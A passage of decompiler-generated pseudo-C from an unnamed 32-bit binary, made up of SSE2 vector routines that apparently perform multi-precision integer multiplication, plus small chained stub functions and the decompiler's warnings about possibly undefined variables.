  __m128i *v123; // edx
  __m128i v124; // xmm6
  __m128i v125; // xmm1
  __m128i v126; // xmm4
  __m128i v127; // xmm6
  __m128i v128; // xmm1
  __m128i v129; // xmm4
  __m128i v130; // xmm6
  __m128i v131; // xmm1
  __m128i v132; // xmm4
  __m128i v133; // xmm6
  __m128i v134; // xmm1
  __m128i v135; // xmm4
  __m128i v136; // xmm6
  __m128i v137; // xmm1
  __m128i v138; // xmm4
  __m128i v139; // xmm6
  __m128i v140; // xmm1
  __m128i v141; // xmm4
  __m128i v142; // xmm6
  __m128i v143; // xmm1
  __m128 v144; // xmm6
  __m128i v145; // [esp+10h] [ebp-18Ch] BYREF
  __m128i v146; // [esp+20h] [ebp-17Ch] BYREF
  __m128i v147; // [esp+30h] [ebp-16Ch] BYREF
  __m128i v148; // [esp+40h] [ebp-15Ch] BYREF
  __m128i v149; // [esp+50h] [ebp-14Ch] BYREF
  __m128i v150; // [esp+60h] [ebp-13Ch] BYREF
  __m128i v151; // [esp+70h] [ebp-12Ch] BYREF
  __m128i v152; // [esp+80h] [ebp-11Ch] BYREF
  __m128i v153; // [esp+90h] [ebp-10Ch]
  __m128i v154[7]; // [esp+A0h] [ebp-FCh]
  __m128i v155; // [esp+110h] [ebp-8Ch] BYREF
  __m128i v156; // [esp+120h] [ebp-7Ch] BYREF
  __m128i v157; // [esp+130h] [ebp-6Ch] BYREF
  __m128i v158; // [esp+140h] [ebp-5Ch] BYREF
  __m128i v159; // [esp+150h] [ebp-4Ch] BYREF
  __m128i v160; // [esp+160h] [ebp-3Ch] BYREF
  __m128i v161; // [esp+170h] [ebp-2Ch] BYREF
  __m128i v162; // [esp+180h] [ebp-1Ch] BYREF

  for ( i = 0; i != 64; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v145 + 2 * i) = v4;
    *(__m128i *)((char *)&v146 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v153 + 2 * i) = v5;
    v154[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v155 + 2 * i) = v6;
    *(__m128i *)((char *)&v156 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v155);
  v8 = _mm_mul_epu32(_mm_load_si128(&v145), v7);
  si128 = _mm_load_si128(&stru_46C990);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v153);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v155);
  v22 = _mm_mul_epu32(_mm_load_si128(&v146), v21);
  v23 = _mm_mul_epu32(v21, v154[0]);
  v24 = _mm_load_si128(&stru_46C990);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_415E79((int)&v146, &v155);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v156);
  v38 = _mm_mul_epu32(_mm_load_si128(&v146), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_46C990);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  sub_415E3C();
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v50 + 16) = _mm_cvtsi128_si32(v48);
  v51 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  v52 = _mm_unpackhi_epi64(v49, v46);
  *(_QWORD *)(v50 + 18) = v51.m128i_i64[0];
  v53 = _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v51, 0x30u));
  v55 = _mm_load_si128(&v156);
  v56 = _mm_mul_epu32(_mm_load_si128(&v147), v55);
  v57 = _mm_mul_epu32(v55, v54[1]);
  v58 = _mm_load_si128(&stru_46C990);
  v59 = _mm_add_epi32(v53, _mm_and_si128(v58, v56));
  v60 = _mm_add_epi32(v52, _mm_srli_epi32(v56, 0x10u));
  v61 = _mm_and_si128(v58, v57);
  v62 = _mm_srli_epi32(v57, 0x10u);
  sub_415DFF();
  v63 = _mm_move_epi64(v61);
  v64 = _mm_move_epi64(v62);
  v65 = _mm_add_epi32(v59, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v61, v63), v63), 4));
  v66 = _mm_add_epi32(v60, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v62, v64), v64), 4));
  *(_DWORD *)(v67 + 24) = _mm_cvtsi128_si32(v65);
  v68 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v65), 0x10u), _mm_move_epi64(v66));
  v69 = _mm_unpackhi_epi64(v66, v63);
  *(_QWORD *)(v67 + 26) = v68.m128i_i64[0];
  v70 = _mm_add_epi32(_mm_unpackhi_epi64(v65, v63), _mm_srli_epi64(v68, 0x30u));
  v71 = _mm_load_si128(&v157);
  v72 = _mm_mul_epu32(_mm_load_si128(&v147), v71);
  v74 = _mm_mul_epu32(v71, *v73);
  v75 = _mm_load_si128(&stru_46C990);
  v76 = _mm_add_epi32(v70, _mm_and_si128(v75, v72));
  v77 = _mm_add_epi32(v69, _mm_srli_epi32(v72, 0x10u));
  v78 = _mm_and_si128(v75, v74);
  v79 = _mm_srli_epi32(v74, 0x10u);
  sub_415DC2();
  v80 = _mm_move_epi64(v78);
  v81 = _mm_move_epi64(v79);
  v82 = _mm_add_epi32(v76, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v78, v80), v80), 4));
  v83 = _mm_add_epi32(v77, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v79, v81), v81), 4));
  *(_DWORD *)(v84 + 32) = _mm_cvtsi128_si32(v82);
  v85 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v82), 0x10u), _mm_move_epi64(v83));
  v86 = _mm_unpackhi_epi64(v83, v80);
  *(_QWORD *)(v84 + 34) = v85.m128i_i64[0];
  v87 = _mm_add_epi32(_mm_unpackhi_epi64(v82, v80), _mm_srli_epi64(v85, 0x30u));
  v89 = _mm_load_si128(&v157);
  v90 = _mm_mul_epu32(_mm_load_si128(&v148), v89);
  v91 = _mm_mul_epu32(v89, v88[1]);
  v92 = _mm_load_si128(&stru_46C990);
  v93 = _mm_add_epi32(v87, _mm_and_si128(v92, v90));
  v94 = _mm_add_epi32(v86, _mm_srli_epi32(v90, 0x10u));
  v95 = _mm_and_si128(v92, v91);
  v96 = _mm_srli_epi32(v91, 0x10u);
  sub_415D85();
  v97 = _mm_move_epi64(v95);
  v98 = _mm_move_epi64(v96);
  v99 = _mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v95, v97), v97), 4));
  v100 = _mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v96, v98), v98), 4));
  *(_DWORD *)(v101 + 40) = _mm_cvtsi128_si32(v99);
  v102 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v99), 0x10u), _mm_move_epi64(v100));
  v103 = _mm_unpackhi_epi64(v100, v97);
  *(_QWORD *)(v101 + 42) = v102.m128i_i64[0];
  v104 = _mm_add_epi32(_mm_unpackhi_epi64(v99, v97), _mm_srli_epi64(v102, 0x30u));
  v105 = _mm_load_si128(&v158);
  v106 = _mm_mul_epu32(_mm_load_si128(&v148), v105);
  v108 = _mm_mul_epu32(v105, *v107);
  v109 = _mm_load_si128(&stru_46C990);
  v110 = _mm_add_epi32(v104, _mm_and_si128(v109, v106));
  v111 = _mm_add_epi32(v103, _mm_srli_epi32(v106, 0x10u));
  v112 = _mm_and_si128(v109, v108);
  v113 = _mm_srli_epi32(v108, 0x10u);
  result = sub_415D48();
  v115 = _mm_move_epi64(v112);
  v116 = _mm_move_epi64(v113);
  v117 = _mm_add_epi32(v110, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v115), v115), 4));
  v118 = _mm_add_epi32(v111, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v113, v116), v116), 4));
  v119 = (__m128)_mm_move_epi64(v118);
  *(_DWORD *)(v120 + 48) = _mm_cvtsi128_si32(v117);
  v121 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v117), 0x10u), (__m128i)v119);
  *(_QWORD *)(v120 + 50) = v121.m128i_i64[0];
  v122 = _mm_add_epi32(_mm_unpackhi_epi64(v117, v115), _mm_srli_epi64(v121, 0x30u));
  ++v123;
  v124 = _mm_load_si128(&v158);
  v125 = _mm_load_si128(&v162);
  v126 = _mm_add_epi64(
           _mm_add_epi64(
             _mm_add_epi64(v122, _mm_mul_epu32(_mm_load_si128(&v149), v124)),
             _mm_slli_epi64(_mm_unpackhi_epi64(v118, v115), 0x10u)),
           _mm_mul_epu32(_mm_load_si128(&v145), v125));
  v127 = _mm_add_epi32(_mm_mul_epu32(v124, *v123), _mm_mul_epu32(v125, v123[-4]));
  v128 = _mm_load_si128(&v155);
  v129 = _mm_add_epi64(v126, _mm_mul_epu32(_mm_load_si128(&v152), v128));
  v130 = _mm_add_epi32(v127, _mm_mul_epu32(v128, v123[3]));
  v131 = _mm_load_si128(&v161);
  v132 = _mm_add_epi64(v129, _mm_mul_epu32(_mm_load_si128(&v146), v131));
  v133 = _mm_add_epi32(v130, _mm_mul_epu32(v131, v123[-3]));
  v134 = _mm_load_si128(&v156);
  v135 = _mm_add_epi64(v132, _mm_mul_epu32(_mm_load_si128(&v151), v134));
  v136 = _mm_add_epi32(v133, _mm_mul_epu32(v134, v123[2]));
  v137 = _mm_load_si128(&v160);
  v138 = _mm_add_epi64(v135, _mm_mul_epu32(_mm_load_si128(&v147), v137));
  v139 = _mm_add_epi32(v136, _mm_mul_epu32(v137, v123[-2]));
  v140 = _mm_load_si128(&v157);
  v141 = _mm_add_epi64(v138, _mm_mul_epu32(_mm_load_si128(&v150), v140));
  v142 = _mm_add_epi32(v139, _mm_mul_epu32(v140, v123[1]));
  v143 = _mm_load_si128(&v159);
  v144 = (__m128)_mm_add_epi32(v142, _mm_mul_epu32(v143, v123[-1]));
  *(_QWORD *)(v120 + 56) = _mm_add_epi32(
                             _mm_add_epi64(v141, _mm_mul_epu32(_mm_load_si128(&v148), v143)),
                             _mm_slli_epi64(_mm_add_epi32((__m128i)v144, (__m128i)_mm_movehl_ps(v119, v144)), 0x20u)).m128i_u64[0];
  return result;
}
// 415F7B: variable 'v33' is possibly undefined
// 415FB2: variable 'v39' is possibly undefined
// 41600B: variable 'v50' is possibly undefined
// 416032: variable 'v54' is possibly undefined
// 41609E: variable 'v67' is possibly undefined
// 4160D5: variable 'v73' is possibly undefined
// 41612E: variable 'v84' is possibly undefined
// 416155: variable 'v88' is possibly undefined
// 4161C1: variable 'v101' is possibly undefined
// 4161F8: variable 'v107' is possibly undefined
// 416251: variable 'v120' is possibly undefined
// 416278: variable 'v123' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;
// 415C8B: using guessed type __m128i anonymous_11;

//----- (00415D48) --------------------------------------------------------
int sub_415D48()
{
  return sub_415D85();
}
// 415D85: using guessed type int sub_415D85(void);

//----- (00415D85) --------------------------------------------------------
int sub_415D85()
{
  return sub_415DC2();
}
// 415DC2: using guessed type int sub_415DC2(void);

//----- (00415DC2) --------------------------------------------------------
int sub_415DC2()
{
  return sub_415DFF();
}
// 415DFF: using guessed type int sub_415DFF(void);

//----- (00415DFF) --------------------------------------------------------
int sub_415DFF()
{
  return sub_415E3C();
}
// 415E3C: using guessed type int sub_415E3C(void);

//----- (00415E3C) --------------------------------------------------------
int sub_415E3C()
{
  return sub_415E79();
}
// 415E79: using guessed type int sub_415E79(void);

//----- (00415E79) --------------------------------------------------------
__m128i __usercall sub_415E79@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00416370) --------------------------------------------------------
int __cdecl sub_416370(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  int v50; // ecx
  __m128i v51; // xmm6
  __m128i v52; // xmm5
  __m128i v53; // xmm4
  __m128i *v54; // edx
  __m128i v55; // xmm7
  __m128i v56; // xmm0
  __m128i v57; // xmm7
  __m128i v58; // xmm6
  __m128i v59; // xmm4
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm7
  __m128i v63; // xmm0
  __m128i v64; // xmm1
  __m128i v65; // xmm4
  __m128i v66; // xmm5
  int v67; // ecx
  __m128i v68; // xmm6
  __m128i v69; // xmm5
  __m128i v70; // xmm4
  __m128i v71; // xmm7
  __m128i v72; // xmm0
  __m128i *v73; // edx
  __m128i v74; // xmm7
  __m128i v75; // xmm6
  __m128i v76; // xmm4
  __m128i v77; // xmm5
  __m128i v78; // xmm6
  __m128i v79; // xmm7
  __m128i v80; // xmm0
  __m128i v81; // xmm1
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  int v84; // ecx
  __m128i v85; // xmm6
  __m128i v86; // xmm5
  __m128i v87; // xmm4
  __m128i *v88; // edx
  __m128i v89; // xmm7
  __m128i v90; // xmm0
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm4
  __m128i v94; // xmm5
  __m128i v95; // xmm6
  __m128i v96; // xmm7
  __m128i v97; // xmm0
  __m128i v98; // xmm1
  __m128i v99; // xmm4
  __m128i v100; // xmm5
  int v101; // ecx
  __m128i v102; // xmm6
  __m128i v103; // xmm5
  __m128i v104; // xmm4
  __m128i v105; // xmm7
  __m128i v106; // xmm0
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm4
  __m128i v111; // xmm5
  __m128i v112; // xmm6
  __m128i v113; // xmm7
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128i v116; // xmm4
  __m128i v117; // xmm5
  int v118; // ecx
  __m128i v119; // xmm6
  __m128i v120; // xmm5
  __m128i v121; // xmm4
  __m128i *v122; // edx
  __m128i v123; // xmm7
  __m128i v124; // xmm0
  __m128i v125; // xmm7
  __m128i v126; // xmm6
  __m128i v127; // xmm4
  __m128i v128; // xmm5
  __m128i v129; // xmm6
  __m128i v130; // xmm7
  __m128i v131; // xmm0
  __m128i v132; // xmm1
  __m128i v133; // xmm4
  __m128i v134; // xmm5
  int v135; // ecx
  __m128i v136; // xmm6
  __m128i v137; // xmm5
  __m128i v138; // xmm4
  __m128i v139; // xmm7
  __m128i v140; // xmm0
  __m128i *v141; // edx
  __m128i v142; // xmm7
  __m128i v143; // xmm6
  __m128i v144; // xmm4
  __m128i v145; // xmm5
  __m128i v146; // xmm6
  __m128i v147; // xmm7
  __m128i v148; // xmm0
  __m128i v149; // xmm1
  __m128i v150; // xmm4
  __m128i v151; // xmm5
  int v152; // ecx
  __m128i v153; // xmm6
  __m128i v154; // xmm5
  __m128i v155; // xmm4
  __m128i *v156; // edx
  __m128i v157; // xmm7
  __m128i v158; // xmm0
  __m128i v159; // xmm7
  __m128i v160; // xmm6
  __m128i v161; // xmm4
  __m128i v162; // xmm5
  __m128i v163; // xmm6
  __m128i v164; // xmm7
  __m128i v165; // xmm0
  __m128i v166; // xmm1
  __m128i v167; // xmm4
  __m128i v168; // xmm5
  int v169; // ecx
  __m128i v170; // xmm6
  __m128i v171; // xmm5
  __m128i v172; // xmm4
  __m128i v173; // xmm7
  __m128i v174; // xmm0
  __m128i *v175; // edx
  __m128i v176; // xmm7
  __m128i v177; // xmm6
  __m128i v178; // xmm4
  __m128i v179; // xmm5
  __m128i v180; // xmm6
  __m128i v181; // xmm7
  __m128i v182; // xmm0
  __m128i v183; // xmm1
  __m128i v184; // xmm4
  __m128i v185; // xmm5
  int v186; // ecx
  __m128i v187; // xmm6
  __m128i v188; // xmm5
  __m128i v189; // xmm4
  __m128i *v190; // edx
  __m128i v191; // xmm7
  __m128i v192; // xmm0
  __m128i v193; // xmm7
  __m128i v194; // xmm6
  __m128i v195; // xmm4
  __m128i v196; // xmm5
  __m128i v197; // xmm6
  __m128i v198; // xmm7
  __m128i v199; // xmm0
  __m128i v200; // xmm1
  __m128i v201; // xmm4
  __m128i v202; // xmm5
  int v203; // ecx
  __m128i v204; // xmm6
  __m128i v205; // xmm5
  __m128i v206; // xmm4
  __m128i v207; // xmm7
  __m128i v208; // xmm0
  __m128i *v209; // edx
  __m128i v210; // xmm7
  __m128i v211; // xmm6
  __m128i v212; // xmm4
  __m128i v213; // xmm5
  __m128i v214; // xmm6
  __m128i v215; // xmm7
  __m128i v216; // xmm0
  __m128i v217; // xmm1
  __m128i v218; // xmm4
  __m128i v219; // xmm5
  int v220; // ecx
  __m128i v221; // xmm6
  __m128i v222; // xmm5
  __m128i v223; // xmm4
  __m128i *v224; // edx
  __m128i v225; // xmm7
  __m128i v226; // xmm0
  __m128i v227; // xmm7
  __m128i v228; // xmm6
  __m128i v229; // xmm4
  __m128i v230; // xmm5
  __m128i v231; // xmm6
  __m128i v232; // xmm7
  __m128i v233; // xmm0
  __m128i v234; // xmm1
  __m128i v235; // xmm4
  __m128i v236; // xmm5
  int v237; // ecx
  __m128i v238; // xmm6
  __m128i v239; // xmm5
  __m128i v240; // xmm4
  __m128i v241; // xmm7
  __m128i v242; // xmm0
  __m128i *v243; // edx
  __m128i v244; // xmm7
  __m128i v245; // xmm6
  __m128i v246; // xmm4
  __m128i v247; // xmm5
  __m128i v248; // xmm6
  __m128i v249; // xmm7
  int result; // eax
  __m128i v251; // xmm0
  __m128i v252; // xmm1
  __m128i v253; // xmm4
  __m128i v254; // xmm5
  __m128 v255; // xmm7
  int v256; // ecx
  __m128i v257; // xmm6
  __m128i v258; // xmm4
  __m128i *v259; // edx
  __m128i v260; // xmm6
  __m128i v261; // xmm1
  __m128i v262; // xmm4
  __m128i v263; // xmm6
  __m128i v264; // xmm1
  __m128i v265; // xmm4
  __m128i v266; // xmm6
  __m128i v267; // xmm1
  __m128i v268; // xmm4
  __m128i v269; // xmm6
  __m128i v270; // xmm1
  __m128i v271; // xmm4
  __m128i v272; // xmm6
  __m128i v273; // xmm1
  __m128i v274; // xmm4
  __m128i v275; // xmm6
  __m128i v276; // xmm1
  __m128i v277; // xmm4
  __m128i v278; // xmm6
  __m128i v279; // xmm1
  __m128i v280; // xmm4
  __m128i v281; // xmm6
  __m128i v282; // xmm1
  __m128i v283; // xmm4
  __m128i v284; // xmm6
  __m128i v285; // xmm1
  __m128i v286; // xmm4
  __m128i v287; // xmm6
  __m128i v288; // xmm1
  __m128i v289; // xmm4
  __m128i v290; // xmm6
  __m128i v291; // xmm1
  __m128i v292; // xmm4
  __m128i v293; // xmm6
  __m128i v294; // xmm1
  __m128i v295; // xmm4
  __m128i v296; // xmm6
  __m128i v297; // xmm1
  __m128i v298; // xmm4
  __m128i v299; // xmm6
  __m128i v300; // xmm1
  __m128i v301; // xmm4
  __m128i v302; // xmm6
  __m128i v303; // xmm1
  __m128 v304; // xmm6
  __m128i v305; // [esp+10h] [ebp-30Ch] BYREF
  __m128i v306; // [esp+20h] [ebp-2FCh] BYREF
  __m128i v307; // [esp+30h] [ebp-2ECh] BYREF
  __m128i v308; // [esp+40h] [ebp-2DCh] BYREF
  __m128i v309; // [esp+50h] [ebp-2CCh] BYREF
  __m128i v310; // [esp+60h] [ebp-2BCh] BYREF
  __m128i v311; // [esp+70h] [ebp-2ACh] BYREF
  __m128i v312; // [esp+80h] [ebp-29Ch] BYREF
  __m128i v313; // [esp+90h] [ebp-28Ch] BYREF
  __m128i v314; // [esp+A0h] [ebp-27Ch] BYREF
  __m128i v315; // [esp+B0h] [ebp-26Ch] BYREF
  __m128i v316; // [esp+C0h] [ebp-25Ch] BYREF
  __m128i v317; // [esp+D0h] [ebp-24Ch] BYREF
  __m128i v318; // [esp+E0h] [ebp-23Ch] BYREF
  __m128i v319; // [esp+F0h] [ebp-22Ch] BYREF
  __m128i v320; // [esp+100h] [ebp-21Ch] BYREF
  __m128i v321; // [esp+110h] [ebp-20Ch]
  __m128i v322[15]; // [esp+120h] [ebp-1FCh]
  __m128i v323; // [esp+210h] [ebp-10Ch] BYREF
  __m128i v324; // [esp+220h] [ebp-FCh] BYREF
  __m128i v325; // [esp+230h] [ebp-ECh] BYREF
  __m128i v326; // [esp+240h] [ebp-DCh] BYREF
  __m128i v327; // [esp+250h] [ebp-CCh] BYREF
  __m128i v328; // [esp+260h] [ebp-BCh] BYREF
  __m128i v329; // [esp+270h] [ebp-ACh] BYREF
  __m128i v330; // [esp+280h] [ebp-9Ch] BYREF
  __m128i v331; // [esp+290h] [ebp-8Ch] BYREF
  __m128i v332; // [esp+2A0h] [ebp-7Ch] BYREF
  __m128i v333; // [esp+2B0h] [ebp-6Ch] BYREF
  __m128i v334; // [esp+2C0h] [ebp-5Ch] BYREF
  __m128i v335; // [esp+2D0h] [ebp-4Ch] BYREF
  __m128i v336; // [esp+2E0h] [ebp-3Ch] BYREF
  __m128i v337; // [esp+2F0h] [ebp-2Ch] BYREF
  __m128i v338; // [esp+300h] [ebp-1Ch] BYREF

  for ( i = 0; i != 128; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v305 + 2 * i) = v4;
    *(__m128i *)((char *)&v306 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v321 + 2 * i) = v5;
    v322[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v323 + 2 * i) = v6;
    *(__m128i *)((char *)&v324 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v323);
  v8 = _mm_mul_epu32(_mm_load_si128(&v305), v7);
  si128 = _mm_load_si128(&stru_46C990);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v321);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v323);
  v22 = _mm_mul_epu32(_mm_load_si128(&v306), v21);
  v23 = _mm_mul_epu32(v21, v322[0]);
  v24 = _mm_load_si128(&stru_46C990);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_416749((int)&v306, &v323);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v324);
  v38 = _mm_mul_epu32(_mm_load_si128(&v306), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_46C990);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  sub_41670C();
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v50 + 16) = _mm_cvtsi128_si32(v48);
  v51 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  v52 = _mm_unpackhi_epi64(v49, v46);
  *(_QWORD *)(v50 + 18) = v51.m128i_i64[0];
  v53 = _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v51, 0x30u));
  v55 = _mm_load_si128(&v324);
  v56 = _mm_mul_epu32(_mm_load_si128(&v307), v55);
  v57 = _mm_mul_epu32(v55, v54[1]);
  v58 = _mm_load_si128(&stru_46C990);
  v59 = _mm_add_epi32(v53, _mm_and_si128(v58, v56));
  v60 = _mm_add_epi32(v52, _mm_srli_epi32(v56, 0x10u));
  v61 = _mm_and_si128(v58, v57);
  v62 = _mm_srli_epi32(v57, 0x10u);
  sub_4166CF();
  v63 = _mm_move_epi64(v61);
  v64 = _mm_move_epi64(v62);
  v65 = _mm_add_epi32(v59, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v61, v63), v63), 4));
  v66 = _mm_add_epi32(v60, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v62, v64), v64), 4));
  *(_DWORD *)(v67 + 24) = _mm_cvtsi128_si32(v65);
